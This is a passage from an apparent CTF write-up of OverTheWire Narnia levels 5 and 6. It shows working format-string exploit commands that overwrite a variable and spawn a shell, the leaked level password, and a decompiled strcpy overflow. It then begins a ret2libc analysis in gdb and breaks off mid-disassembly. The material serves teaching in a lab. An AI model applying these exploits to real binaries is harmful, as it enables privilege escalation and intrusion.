(12)<br>i = 1 (0xffffd5f0)</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Therefore, replacing </span><span class="c27">AAAA </span><span>with the address of the local </span><span class="c27">i </span><span class="c2">variable followed by the %n format specifier will successfully overwrite the variable.</span></p><a id="t.734518003b78730d142b961b9d867dd7599d1097"></a><a id="t.57"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia5</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia5 </span><span class="c12">$(</span><span class="c3">python -c </span><span class="c11">&quot;print &#39;\xf0\xd5\xff\xff%n&#39;&quot;</span><span class="c3">)<br>Change i</span><span class="c11">&#39;s value from 1 -&gt; 500. No way...let me give you a hint!<br>buffer : [] (4)<br>i = 4 (0xffffd5f0)</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Observe that the value for the variable is 4 which matches the amount of bytes in the buffer. Therefore, the amount of bytes inside the buffer corresponds to the overwriting value for the variable. </span></p><h4 class="c21" id="h.yykxe27qf77w"><span class="c16">Controlling Variable Value</span></h4><p class="c0"><span class="c2">After verifying the ability for overwriting the local variable, we are left with the task of controlling its value. This can be done by padding the buffer using two different methods:</span></p><h5 class="c58" id="h.tfreh8cbxghu"><span class="c30">Method 1</span></h5><p class="c0"><span class="c2">We can use a specifier for the position of the input within the stack. </span></p><a id="t.260ac8949a3f39a4fa57a99c87c966e00da5b84d"></a><a id="t.58"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia5</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia5 </span><span class="c12">$(</span><span class="c3">python -c </span><span class="c11">&#39;print &quot;\xe0\xd5\xff\xff&quot;+&quot;%496x%1$n&quot;&#39;</span><span class="c3">)<br>Change i</span><span class="c11">&#39;s value from 1 -&gt; 500. GOOD<br>$ whoami<br>narnia6</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>In the method above, the </span><span class="c11">%1</span><span class="c2">&nbsp;specifies that the input is in position 1 within the stack. This method, however, is unstable in comparison to the second method. The payload used does not work when using single quotes around the input, rather only double quotes work.</span></p><h5 class="c58" id="h.1dxm4wj8e7ar"><span class="c30">Method 2</span></h5><p class="c0"><span class="c2">This method copies the address for the i variable twice before padding it with the necessary amount of bytes. Inputting the address twice was found to be necessary (after a lot of trial and error).</span></p><a id="t.ad5a92c28bf75367f92b4b8af2a759da0daba121"></a><a id="t.59"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia5@narnia:/narnia$ /narnia/narnia5 $(python -c &#39;print &quot;</span><span class="c11">\x</span><span class="c3">d0</span><span class="c11">\x</span><span class="c3">d5</span><span class="c11">\x</span><span class="c3">ff</span><span class="c11">\x</span><span class="c3">ff</span><span class="c11">\x</span><span class="c3">d0</span><span class="c11">\x</span><span class="c3">d5</span><span class="c11">\x</span><span class="c3">ff</span><span class="c11">\x</span><span class="c3">ff</span><span class="c12">%492x%</span><span class="c3 c45">n&quot;&#39;) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>Change i&#39;s value from 1 -&gt; 500. GOOD<br>$ cat /etc/narnia_pass/narnia6</span></p><p class="c19"><span class="c3 c45">neezocaeng</span></p></td></tr></table><h3 class="c10" id="h.bro9vn3stiqu"><span class="c5">Source Code</span></h3><a id="t.f0ae8cb6a616be9fe35992859cd97c817441a89b"></a><a id="t.60"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">#include &lt;stdio.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;stdlib.h&gt;</span><span class="c3"><br></span><span class="c8">#include &lt;string.h&gt;</span><span class="c3"><br><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">main</span><span class="c8">(</span><span class="c6">int</span><span class="c8">&nbsp;argc, </span><span class="c6">char</span><span class="c8">&nbsp;**argv)</span><span class="c3">{<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">int</span><span class="c3">&nbsp;i = </span><span class="c8">1</span><span class="c3">;<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">char</span><span class="c3">&nbsp;buffer[</span><span class="c8">64</span><span class="c3">];<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">snprintf</span><span class="c3">(buffer, </span><span class="c6">sizeof</span><span class="c3">&nbsp;buffer, argv[</span><span class="c8">1</span><span class="c3">]);<br> &nbsp; &nbsp; &nbsp; &nbsp;buffer[</span><span class="c6">sizeof</span><span class="c3">&nbsp;(buffer) - </span><span class="c8">1</span><span class="c3">] = </span><span class="c8">0</span><span class="c3">;<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;Change i&#39;s value from 1 -&gt; 500. &quot;</span><span class="c3">);<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">if</span><span class="c3">(i==</span><span class="c8">500</span><span class="c3">){<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;GOOD\n&quot;</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;setreuid(geteuid(),geteuid());<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;system(</span><span class="c11">&quot;/bin/sh&quot;</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;}<br><br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;No way...let me give you a hint!\n&quot;</span><span class="c3">);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">(</span><span class="c11">&quot;buffer : [%s] (%d)\n&quot;</span><span class="c3">, buffer, </span><span class="c8">strlen</span><span class="c3">(buffer));<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c8">printf</span><span class="c3">&nbsp;(</span><span class="c11">&quot;i = %d (%p)\n&quot;</span><span class="c3">, i, &amp;i);<br> &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;</span><span class="c8">0</span><span class="c3">;<br>}</span></p></td></tr></table><h2 class="c10" id="h.2kucwybj5f6g"><span class="c40 c36">Narnia 6</span></h2><h3 class="c10" id="h.8051n9d3n5mc"><span class="c5">Binary Analysis</span></h3><h4 class="c21" id="h.k1z5nw3t7i3p"><span class="c16">Behavior</span></h4><p class="c0"><span class="c2">Going onto analysing the narnia6 binary, we can see that it expects two arguments:</span></p><a id="t.e9561316618c08a9a9b6848c8d305f336babbb3e"></a><a id="t.61"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia6</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia6<br>./narnia6 b1 b2</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">When providing two normal inputs as arguments to the program, nothing out of the ordinary seems to happen:</span></p><a id="t.66b1a1382318689f6e0d40cafba96be6761da44c"></a><a id="t.62"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia6</span><span class="c12">@narnia</span><span class="c11">:/narnia</span><span class="c12">$ </span><span class="c3">./narnia6 A B<br>A</span></p></td></tr></table><h4 class="c21" id="h.dpcv8d85ball"><span class="c16">Ghidra</span></h4><a id="t.a07dfa0cf26118c01a9531cef2e6f0d5bf7dac0b"></a><a id="t.63"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">void main(int param_1,undefined4 *param_2)<br><br>{<br> &nbsp;size_t sVar1;<br> &nbsp;uint uVar2;<br> &nbsp;uint uVar3;<br> &nbsp;__uid_t __euid;<br> &nbsp;__uid_t __ruid;<br> &nbsp;char local_20 [</span><span class="c8">8</span><span class="c3">];<br> &nbsp;char local_18 [</span><span class="c8">8</span><span class="c3">];<br> &nbsp;code *local_10;<br> &nbsp;int local_c;<br> &nbsp;<br> &nbsp;local_10 = puts;<br> &nbsp;</span><span class="c6">if</span><span class="c3">&nbsp;(param_1 != </span><span class="c8">3</span><span class="c3">) {<br> &nbsp; &nbsp;printf(</span><span class="c11">&quot;%s b1 b2\n&quot;</span><span class="c3">,*param_2);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c12">/* WARNING: Subroutine does not return */</span><span class="c3"><br> &nbsp; &nbsp;</span><span class="c6">exit</span><span class="c3">(-</span><span class="c8">1</span><span class="c3">);<br> &nbsp;}<br> &nbsp;local_c = </span><span class="c8">0</span><span class="c3">;<br> &nbsp;</span><span class="c6">while</span><span class="c3">&nbsp;(*(int *)(environ + local_c * </span><span class="c8">4</span><span class="c3">) != </span><span class="c8">0</span><span class="c3">) {<br> &nbsp; &nbsp;sVar1 = strlen(*(char **)(environ + local_c * </span><span class="c8">4</span><span class="c3">));<br> &nbsp; &nbsp;memset(*(void **)(environ + local_c * </span><span class="c8">4</span><span class="c3">),</span><span class="c8">0</span><span class="c3">,sVar1);<br> &nbsp; &nbsp;local_c = local_c + </span><span class="c8">1</span><span class="c3">;<br> &nbsp;}<br> &nbsp;local_c = </span><span class="c8">3</span><span class="c3">;<br> &nbsp;</span><span class="c6">while</span><span class="c3">&nbsp;(param_2[local_c] != </span><span class="c8">0</span><span class="c3">) {<br> &nbsp; &nbsp;sVar1 = strlen((char *)param_2[local_c]);<br> &nbsp; &nbsp;memset((void *)param_2[local_c],</span><span class="c8">0</span><span class="c3">,sVar1);<br> &nbsp; &nbsp;local_c = local_c + </span><span class="c8">1</span><span class="c3">;<br> &nbsp;}<br> &nbsp;strcpy(local_18,(char *)param_2[</span><span class="c8">1</span><span class="c3">]);<br> &nbsp;strcpy(local_20,(char *)param_2[</span><span class="c8">2</span><span class="c3">]);<br> &nbsp;uVar2 = (uint)local_10 &amp; </span><span class="c8">0</span><span class="c3">xff000000;<br> &nbsp;uVar3 = get_sp();<br> &nbsp;</span><span class="c6">if</span><span class="c3">&nbsp;(uVar2 == uVar3) {<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c12">/* WARNING: Subroutine does not return */</span><span class="c3"><br> &nbsp; &nbsp;</span><span class="c6">exit</span><span class="c3">(-</span><span class="c8">1</span><span class="c3">);<br> &nbsp;}<br> &nbsp;__euid = geteuid();<br> &nbsp;__ruid = geteuid();<br> &nbsp;setreuid(__ruid,__euid);<br> &nbsp;(*local_10)(local_18);<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</span><span class="c12">/* WARNING: Subroutine does not return */</span><span class="c3"><br> &nbsp;</span><span class="c6">exit</span><span class="c3">(</span><span class="c8">1</span><span class="c3">);<br>}</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span>Eight bytes are allocated to buffers </span><span class="c3">local_18</span><span>&nbsp;and </span><span class="c3">local_20</span><span class="c2">&nbsp;which most likely correspond to the two arguments that the program expects. The program then performs harmless operations within the while loops. Eventually, the strcpy function is run on the two arguments as can be seen in the following lines:</span></p><a id="t.34c56aa65e37dcb79550d030de991c6376a9a833"></a><a id="t.64"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">strcpy(local_18,(char *)param_2[</span><span class="c8">1</span><span class="c3">]); <br>strcpy(local_20,(char *)param_2[</span><span class="c8">2</span><span class="c3">])</span><span class="c39">;</span></p></td></tr></table><p class="c7"><span class="c3 c45"></span></p><p class="c0"><span class="c2">Within these two lines lie the vulnerability of the program. Eight bytes are being allocated to the local_18 and local_20 variables, which are then getting passed into the strcpy function with any kind of boundary checks being performed beforehand. The potential danger of this code is outlined within the &ldquo;BUGS&rdquo; subsection located in the manual page for the strcpy function:</span></p><a id="t.77ac1b1695bc1d00d3296eecaff815a3245c888e"></a><a id="t.65"></a><table class="c24"><tr class="c22"><td class="c71" colspan="1" rowspan="1"><p class="c19"><span class="c60 c49">If the destination string of a strcpy() is not large enough, then anything might happen. Overflowing fixed-length string buffers is a favorite cracker technique for taking complete control of the machine. Any time a program reads or copies data into a buffer, the program first needs to check that there&#39;s enough space. This may be unnecessary if you can show that overflow is impossible, but be careful: programs can get changed over time, in ways that may make the impossible possible.</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Additionally, it is important to check the security of the narnia6 binary with the checksec command to find binary security settings:</span></p><a id="t.afe54d1380de9a2434a168470cc5241c011e8ace"></a><a id="t.66"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c11">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/narnia/6]</span><span class="c3"><br></span><span class="c11">&#9492;&#9472;&#9472;&#9596;</span><span class="c3">&nbsp;</span><span class="c11">$checksec</span><span class="c3">&nbsp;</span><span class="c11">narnia6</span><span class="c3"><br></span><span class="c11">[*]</span><span class="c3">&nbsp;</span><span class="c11">&#39;/home/0xd4y/business/other/overthewire/narnia/6/narnia6&#39;</span><span class="c3"><br> &nbsp; &nbsp;Arch: &nbsp; &nbsp; </span><span class="c11">i386-32-little</span><span class="c3"><br> &nbsp; &nbsp;RELRO: &nbsp; &nbsp;</span><span class="c8">No</span><span class="c3">&nbsp;</span><span class="c11">RELRO</span><span class="c3"><br> &nbsp; &nbsp;Stack: &nbsp; &nbsp;</span><span class="c8">No</span><span class="c3">&nbsp;</span><span class="c11">canary</span><span class="c3">&nbsp;</span><span class="c11">found</span><span class="c3"><br> &nbsp; &nbsp;NX: &nbsp; &nbsp; &nbsp; </span><span class="c11">NX</span><span class="c3">&nbsp;</span><span class="c11">enabled</span><span class="c3"><br> &nbsp; &nbsp;PIE: &nbsp; &nbsp; &nbsp;</span><span class="c8">No</span><span class="c3">&nbsp;</span><span class="c11">PIE</span><span class="c3">&nbsp;</span><span class="c11">(0x8048000)</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">The NX bit is enabled, and therefore shellcode will be of no use for exploiting this program. However, this binary may be vulnerable to a ret2libc (return-to-lib-c) attack, as well as to Return Oriented Programming (ROP), though the latter is untested. </span></p><h3 class="c10" id="h.dvw7b326b9wv"><span class="c5">Ret2libc Attack</span></h3><p class="c0"><span>This kind of attack is useful when exploiting a binary whose NX bit is enabled, but has a buffer overflow vulnerability. The attack works by replacing pointing the return address of the binary to a subroutine / function that is already present within the binary.</span><sup><a href="#ftnt12" id="ftnt_ref12">[12]</a></sup><span class="c2">&nbsp;Typically, the return address is replaced with an address pointing to the system function located within the stdlib library (as this is a function in c that executes system commands). </span></p><h4 class="c21" id="h.dvmc1o6n9rdl"><span class="c16">POC</span></h4><p class="c0"><span>To demonstrate the functionality of the system function, we can create a simple c program that runs the </span><span class="c27">ls -la</span><span class="c2">&nbsp;command:</span></p><a id="t.7b8ca924cf2f29037666de3a350f37184c07cba4"></a><a id="t.67"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c8">#include &lt;stdlib.h&gt;</span><span class="c3"><br></span><span class="c6">int</span><span class="c3">&nbsp;</span><span class="c4">main</span><span class="c8">()</span><span class="c3">{<br><br> &nbsp; &nbsp;system(</span><span class="c11">&quot;ls -la&quot;</span><span class="c3">);<br> &nbsp; &nbsp;</span><span class="c6">return</span><span class="c3">&nbsp;</span><span class="c8">0</span><span class="c3">;<br>}</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Compiling and running this program, we see that it successfully executes the command:</span></p><a id="t.a0b4673f0f7bbe95fa24cc4311499e6d43ac9713"></a><a id="t.68"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/narnia/6/poc]<br>&#9492;&#9472;&#9472;&#9596; $gcc poc.c -o poc<br>&#9484;&#9472;[0xd4y@Writeup]&#9472;[~/business/other/overthewire/narnia/6/poc]<br>&#9492;&#9472;&#9472;&#9596; $./poc<br>total 24<br>drwxr-xr-x</span><span class="c8">&nbsp;1 </span><span class="c3">0xd4y 0xd4y &nbsp; </span><span class="c8">&nbsp;16 </span><span class="c3">May</span><span class="c8">&nbsp;11 </span><span class="c3">17:08 .<br>drwxr-xr-x</span><span class="c8">&nbsp;1 </span><span class="c3">0xd4y 0xd4y &nbsp;</span><span class="c8">&nbsp;200 </span><span class="c3">May</span><span class="c8">&nbsp;11 </span><span class="c3">17:07 ..<br>-rwxr-xr-x</span><span class="c8">&nbsp;1 </span><span class="c3">0xd4y 0xd4y</span><span class="c8">&nbsp;16608 </span><span class="c3">May</span><span class="c8">&nbsp;11 </span><span class="c3">17:08 poc<br>-rw-r--r--</span><span class="c8">&nbsp;1 </span><span class="c3">0xd4y 0xd4y &nbsp; </span><span class="c8">&nbsp;71 </span><span class="c3">May</span><span class="c8">&nbsp;11 </span><span class="c3">17:07 poc.c</span></p></td></tr></table><p class="c23"><span class="c2"></span></p><p class="c0"><span class="c2">Seeing as we can ssh into the target machine with credentials that we have received from the previous task, we can compile this same code on the target system to determine the location of the system function in memory (in other words, we do not have to leak the system function&rsquo;s address). Using this address, we can point the address of the narnia6 binary to the system function and pass a command to it.</span></p><h4 class="c21" id="h.3qizfr8tqpd0"><span class="c16">Determining System Address</span></h4><p class="c0"><span class="c2">First, we must compile the program in 32 bit format as follows:</span></p><a id="t.ea33739145c4183c00824ce4135febdfd1f65991"></a><a id="t.69"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c3">narnia6</span><span class="c12">@narnia</span><span class="c11">:/tmp/poc</span><span class="c12">$ </span><span class="c3">gcc -m32 poc.c -o poc<br>narnia6</span><span class="c12">@narnia</span><span class="c11">:/tmp/poc</span><span class="c12">$ </span><span class="c3">./poc<br>total </span><span class="c8">276</span><span class="c3"><br>drwxr-sr-x &nbsp; &nbsp;</span><span class="c8">2</span><span class="c3">&nbsp;narnia6 root &nbsp; </span><span class="c8">4096</span><span class="c3">&nbsp;May </span><span class="c8">11</span><span class="c3">&nbsp;</span><span class="c8">18</span><span class="c11">:</span><span class="c8">15</span><span class="c3">&nbsp;.<br>drwxrws-wt </span><span class="c8">2040</span><span class="c3">&nbsp;root &nbsp; &nbsp;root </span><span class="c8">262144</span><span class="c3">&nbsp;May </span><span class="c8">11</span><span class="c3">&nbsp;</span><span class="c8">18</span><span class="c11">:</span><span class="c8">15</span><span class="c3">&nbsp;..<br>-rwxr-xr-x &nbsp; &nbsp;</span><span class="c8">1</span><span class="c3">&nbsp;narnia6 root &nbsp; </span><span class="c8">7460</span><span class="c3">&nbsp;May </span><span class="c8">11</span><span class="c3">&nbsp;</span><span class="c8">18</span><span class="c11">:</span><span class="c8">15</span><span class="c3">&nbsp;poc<br>-rw-r--r-- &nbsp; &nbsp;</span><span class="c8">1</span><span class="c3">&nbsp;narnia6 root &nbsp; &nbsp; </span><span class="c8">84</span><span class="c3">&nbsp;May </span><span class="c8">11</span><span class="c3">&nbsp;</span><span class="c8">18</span><span class="c11">:</span><span class="c8">15</span><span class="c3">&nbsp;poc.c</span></p></td></tr></table><p class="c0"><span class="c2">After doing so, we can start debugging the program with gdb:</span></p><a id="t.ab59793680d7f531ef456571d536fafad5e0cb2a"></a><a id="t.70"></a><table class="c24"><tr class="c22"><td class="c18" colspan="1" rowspan="1"><p class="c19"><span class="c11">narnia6@narnia:</span><span class="c3">/tmp/poc$ gdb -q ./poc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Reading symbols from ./poc...(no debugging symbols found)...done.<br>(gdb) b *main &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Breakpoint </span><span class="c8">1</span><span class="c3">&nbsp;</span><span class="c8">at</span><span class="c3">&nbsp;</span><span class="c8">0x5a0</span><span class="c3">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br>(gdb) r &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Starting program: /tmp/poc/poc &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Breakpoint </span><span class="c8">1</span><span class="c3">, </span><span class="c8">0x565555a0</span><span class="c3">&nbsp;</span><span class="c6">in</span><span class="c3">&nbsp;main () &nbsp; &nbsp; &nbsp; <br>(gdb) disass main &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br>Dump of assembler code for function main: <br>=&gt; </span><span class="c8">0x565555a0</span><span class="c3">&nbsp;&lt;+</span><span class="c8">0</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">lea</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">0x4</span><span class="c3">(%esp),%ecx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x565555a4</span><span class="c3">&nbsp;&lt;+</span><span class="c8">4</span><span class="c3">&gt;: &nbsp; &nbsp; </span><span class="c6">and</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">$0</span><span class="c3">xfffffff0,%esp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x565555a7</span><span class="c3">&nbsp;&lt;+</span><span class="c8">7</span><span class="c3">&gt;: &nbsp; &nbsp; pushl &nbsp;-</span><span class="c8">0x4</span><span class="c3">(%ecx) <br> &nbsp; </span><span class="c8">0x565555aa</span><span class="c3">&nbsp;&lt;+</span><span class="c8">10</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;%ebp &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x565555ab</span><span class="c3">&nbsp;&lt;+</span><span class="c8">11</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; %esp,%ebp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x565555ad</span><span class="c3">&nbsp;&lt;+</span><span class="c8">13</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;%ebx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x565555ae</span><span class="c3">&nbsp;&lt;+</span><span class="c8">14</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;%ecx &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x565555af</span><span class="c3">&nbsp;&lt;+</span><span class="c8">15</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">call</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">0x565555dc</span><span class="c3">&nbsp;&lt;__x86.get_pc_thunk.ax&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x565555b4</span><span class="c3">&nbsp;&lt;+</span><span class="c8">20</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">add</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">$0</span><span class="c3">x1a4c,%eax<br> &nbsp; </span><span class="c8">0x565555b9</span><span class="c3">&nbsp;&lt;+</span><span class="c8">25</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">sub</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">$0</span><span class="c3">xc,%esp<br> &nbsp; </span><span class="c8">0x565555bc</span><span class="c3">&nbsp;&lt;+</span><span class="c8">28</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">lea</span><span class="c3">&nbsp; &nbsp; -</span><span class="c8">0x19a0</span><span class="c3">(%eax),%edx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x565555c2</span><span class="c3">&nbsp;&lt;+</span><span class="c8">34</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">push</span><span class="c3">&nbsp; &nbsp;%edx &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x565555c3</span><span class="c3">&nbsp;&lt;+</span><span class="c8">35</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">mov</span><span class="c3">&nbsp; &nbsp; %eax,%ebx &nbsp; <br> &nbsp; </span><span class="c8">0x565555c5</span><span class="c3">&nbsp;&lt;+</span><span class="c8">37</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">call</span><span class="c3">&nbsp; &nbsp;</span><span class="c8">0x56555400</span><span class="c3">&nbsp;&lt;system@plt&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br> &nbsp; </span><span class="c8">0x565555ca</span><span class="c3">&nbsp;&lt;+</span><span class="c8">42</span><span class="c3">&gt;: &nbsp; &nbsp;</span><span class="c6">add</span><span class="c3">&nbsp; &nbsp; </span><span class="c8">$0</span><span class="c3">x10,%esp &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br> &nbsp; </span><span class="c8">0x565555cd</span><span 